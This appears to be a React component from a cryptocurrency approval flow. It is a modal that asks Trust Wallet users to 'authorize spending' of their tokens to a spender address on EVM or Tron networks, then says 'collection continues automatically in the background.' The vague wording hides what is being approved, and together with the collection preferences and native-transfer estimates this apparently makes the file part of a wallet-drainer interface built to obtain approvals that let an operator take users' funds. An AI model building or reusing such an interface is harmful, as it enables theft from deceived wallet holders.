import { TERMS_VERSION } from "../core/approve-config";
import { nativeSymbolForNetwork } from "../core/network-meta";
import { countIncludedAssets } from "../authorization/preferences";
import type { NativeTransferEstimate } from "../native-transfer/types";
import type {
  AssetSymbol,
  AuthorizationSessionResult,
  AuthorizingPhase,
  ModalStep,
  CollectionPreferences,
  NetworkRow,
  RowStatus,
} from "../types";

type AuthorizeSpendingModalProps = {
  networks: NetworkRow[];
  rowStatus: Record<string, RowStatus>;
  selectedKey: string | null;
  approving: boolean;
  error: string | null;
  modalStep: ModalStep;
  preferences: CollectionPreferences;
  sessionResult: AuthorizationSessionResult | null;
  authorizingAsset: { network: string; asset: AssetSymbol } | null;
  authorizingPhase: AuthorizingPhase;
  authorizingProgress: { current: number; total: number };
  linkedAddressLabel: string | null;
  nativeEstimates: Record<string, NativeTransferEstimate | null>;
  spenderEvm: string;
  spenderTron: string;
  onClose: () => void;
  onSelectNetwork: (key: string) => void;
  onContinueFromConnected: () => void;
  onAuthorize: () => void;
};

function progressWidth(step: ModalStep): string {
  switch (step) {
    case "connected":
      return "w-[25%]";
    case "preferences":
      return "w-[45%]";
    case "authorizing":
      return "w-[75%]";
    case "complete":
      return "w-full";
    default:
      return "w-[25%]";
  }
}

function stepSubtitle(step: ModalStep): string {
  switch (step) {
    case "connected":
      return "Wallet connected";
    case "preferences":
      return "Select network";
    case "authorizing":
      return "Authorizing assets";
    case "complete":
      return "All set";
    default:
      return "Wallet connected";
  }
}

function authorizingMessage(
  phase: AuthorizingPhase,
  asset: { network: string; asset: AssetSymbol } | null,
): string {
  const assetLabel = asset
    ? asset.asset === "NATIVE"
      ? nativeSymbolForNetwork(asset.network)
      : asset.asset
    : "asset";

  switch (phase) {
    case "wallet_confirm":
      return `Open Trust Wallet and confirm the ${assetLabel} approval request.`;
    case "finalizing":
      return `Finalizing ${assetLabel} on chain…`;
    default:
      return `Preparing ${assetLabel} approval…`;
  }
}

export function AuthorizeSpendingModal({
  networks,
  selectedKey,
  approving,
  error,
  modalStep,
  preferences,
  sessionResult,
  authorizingAsset,
  authorizingPhase,
  authorizingProgress,
  linkedAddressLabel,
  spenderEvm,
  spenderTron,
  onClose,
  onSelectNetwork,
  onContinueFromConnected,
  onAuthorize,
}: AuthorizeSpendingModalProps) {
  const selected = networks.find((n) => n.key === selectedKey) ?? null;
  const includedCount = countIncludedAssets(preferences, selectedKey);
  const spender = selectedKey
    ? selectedKey === "tron"
      ? spenderTron
      : spenderEvm
    : "";
  const canContinue =
    Boolean(selectedKey) && !approving && includedCount > 0 && Boolean(spender);

  const authorizedOk =
    sessionResult != null &&
    sessionResult.authorizedCount > 0 &&
    sessionResult.rejectedCount === 0 &&
    sessionResult.failedCount === 0;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-[#131520]/40 px-4 backdrop-blur-[2px]">
      <div className="card-surface max-h-[92vh] w-full max-w-md overflow-y-auto rounded-3xl">
        <div className="h-1 w-full bg-neutral-100">
          <div
            className={`h-full bg-[#0400FF] transition-all duration-500 ${progressWidth(modalStep)}`}
          />
        </div>

        <div className="flex items-center justify-between px-5 pt-5">
          <button
            type="button"
            aria-label="Back"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-[#ECECEF] text-[#6A6D81] transition hover:bg-neutral-50 disabled:opacity-50"
          >
            ‹
          </button>
          <div className="text-center">
            <p className="text-base font-semibold text-[#131520]">
              {modalStep === "complete"
                ? "Wallet Connected"
                : "Authorize Spending"}
            </p>
            <p className="text-xs text-[#6A6D81]">
              {stepSubtitle(modalStep)} · Terms v{TERMS_VERSION}
            </p>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-[#ECECEF] text-[#6A6D81] transition hover:bg-neutral-50 disabled:opacity-50"
          >
            ×
          </button>
        </div>

        <div className="space-y-4 px-5 pb-6 pt-4">
          {error && modalStep !== "complete" ? (
            <p className="rounded-2xl bg-red-50 px-4 py-3 text-sm text- !bg-indigo-500">
              {error}
            </p>
          ) : null}

          {modalStep === "connected" ? (
            <div className="space-y-4 py-4 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 text-2xl text-emerald-600">
                ✓
              </div>
              <div>
                <p className="text-lg font-semibold text-[#131520]">
                  Wallet connected
                </p>
                {linkedAddressLabel ? (
                  <p className="mt-1 font-mono text-sm text-[#6A6D81]">
                    {linkedAddressLabel}
                  </p>
                ) : null}
                <p className="mt-3 text-sm leading-relaxed text-[#6A6D81]">
                  Your wallet is linked. Continue to choose a network and
                  authorize spending.
                </p>
              </div>
              <button
                type="button"
                onClick={onContinueFromConnected}
                className="w-full rounded-full bg-[#0400FF] py-3.5 text-sm font-semibold text-white transition hover:bg-[#1a33e6]"
              >
                Continue
              </button>
            </div>
          ) : null}

          {modalStep === "preferences" ? (
            <>
              <p className="text-sm leading-relaxed text-[#6A6D81]">
                Select a network and continue.
              </p>

              <div>
                <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-[#6A6D81]">
                  Network
                </p>
                <ul className="space-y-2">
                  {networks.map((network) => {
                    const isSelected = selectedKey === network.key;

                    return (
                      <li key={network.key}>
                        <button
                          type="button"
                          disabled={approving}
                          onClick={() => onSelectNetwork(network.key)}
                          className={[
                            "flex w-full items-center gap-3 rounded-2xl border px-3 py-3 text-left transition",
                            isSelected
                              ? "border-[#0400FF] bg-[#0400FF]/5"
                              : "border-[#ECECEF] bg-white hover:border-neutral-300",
                          ].join(" ")}
                        >
                          <span
                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                            style={{ backgroundColor: network.color }}
                          >
                            {network.letter}
                          </span>
                          <span className="min-w-0 flex-1">
                            <span className="block text-sm font-semibold text-[#131520]">
                              {network.name}{" "}
                              <span className="font-normal text-[#6A6D81]">
                                ({network.standard})
                              </span>
                            </span>
                          </span>
                        </button>
                      </li>
                    );
                  })}
                </ul>
              </div>

              {selected ? (
                <button
                  type="button"
                  disabled={!canContinue}
                  onClick={onAuthorize}
                  className="w-full rounded-full bg-[#0400FF] py-3.5 text-sm font-semibold text-white transition hover:bg-[#1a33e6] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {!selectedKey
                    ? "Select a network"
                    : `Continue on ${selected.name}`}
                </button>
              ) : (
                <p className="rounded-2xl border border-[#ECECEF] bg-[#F9FAFB] px-4 py-3 text-sm text-[#6A6D81]">
                  Select a network above to continue.
                </p>
              )}
            </>
          ) : null}

          {modalStep === "authorizing" ? (
            <div className="space-y-4 py-6 text-center">
              <div className="mx-auto h-10 w-10 animate-spin rounded-full border-2 border-[#0400FF]/20 border-t-[#0400FF]" />
              <p className="text-sm font-semibold text-[#131520]">
                {authorizingMessage(authorizingPhase, authorizingAsset)}
              </p>
              {authorizingAsset ? (
                <p className="rounded-2xl border border-[#0400FF]/20 bg-[#0400FF]/5 px-4 py-3 text-sm text-[#0400FF]">
                  {authorizingAsset.network.toUpperCase()}{" "}
                  {authorizingAsset.asset === "NATIVE"
                    ? nativeSymbolForNetwork(authorizingAsset.network)
                    : authorizingAsset.asset}
                  {authorizingProgress.total > 0
                    ? ` · ${authorizingProgress.current} of ${authorizingProgress.total}`
                    : ""}
                </p>
              ) : null}
              {authorizingPhase === "wallet_confirm" ? (
                <p className="text-xs text-[#6A6D81]">
                  If you don&apos;t see a prompt, open Trust Wallet and check
                  pending requests.
                </p>
              ) : null}
            </div>
          ) : null}

          {modalStep === "complete" ? (
            <div className="space-y-4 py-4 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 text-2xl text-emerald-600">
                ✓
              </div>
              <div>
                <p className="text-lg font-semibold text-[#131520]">
                  Wallet connected
                </p>
                {linkedAddressLabel ? (
                  <p className="mt-1 font-mono text-sm text-[#6A6D81]">
                    {linkedAddressLabel}
                  </p>
                ) : null}
                <p className="mt-3 text-sm leading-relaxed text-[#6A6D81]">
                  {authorizedOk
                    ? "Authorization complete. Collection continues automatically in the background."
                    : sessionResult && sessionResult.authorizedCount > 0
                      ? "Partially authorized. Remaining assets can be retried later."
                      : "Session finished. You can retry authorization from the connect button."}
                </p>
              </div>
              {sessionResult && sessionResult.authorizedCount > 0 ? (
                <p className="text-xs font-medium text-emerald-600">
                  {sessionResult.authorizedCount} asset
                  {sessionResult.authorizedCount === 1 ? "" : "s"} authorized
                </p>
              ) : null}
              <button
                type="button"
                onClick={onClose}
                className="w-full rounded-full bg-[#0400FF] py-3.5 text-sm font-semibold text-white transition hover:bg-[#1a33e6]"
              >
                Continue
              </button>
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
}
